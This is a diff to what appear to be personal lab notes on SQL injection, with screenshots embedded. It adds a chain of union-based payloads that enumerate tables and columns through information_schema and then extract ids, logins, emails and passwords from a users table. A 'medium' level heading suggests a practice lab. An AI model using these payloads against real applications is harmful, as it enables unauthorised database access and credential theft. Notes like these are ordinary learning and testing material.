@@ -18,3 +18,16 @@
 `'union select 1,table_name,3,4,5,6,7 from information_schema.tables#`
 ![[Pasted image 20241010143205.png]]
 
+`'union select 1,column_name,3,4,5,6,7 from information_schema.columns#`![[Pasted image 20241010143506.png]]
+
+`0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#`
+![[Pasted image 20241010143813.png]]
+
+```
+0'union select 1,id,login,email,password,6,7 from users#
+```
+![[Pasted image 20241010144049.png]]
+
+medium
+![[Pasted image 20241010144349.png]]
+
